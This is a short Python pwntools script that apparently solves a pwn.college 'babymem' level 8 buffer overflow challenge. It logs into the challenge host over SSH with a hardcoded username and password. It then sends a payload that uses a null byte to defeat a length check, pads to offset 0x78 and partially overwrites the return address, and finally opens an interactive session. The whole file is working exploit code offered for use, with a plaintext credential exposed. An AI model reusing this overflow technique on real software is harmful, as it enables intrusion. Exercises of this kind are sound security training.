from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../csec")

context.log_level = 'debug'
p = s.process("./babymem_level8_testing2")
# p = process('./babymem_level8_testing1')

p.sendlineafter(b'Payload size: ',b'1000')
pay = b'A'*10 + b'\x00'
pay = pay.ljust(0x78,b'B')
pay += p16(0x45E0)
# pause()
p.sendafter(b'bytes)!\n',pay)
p.interactive()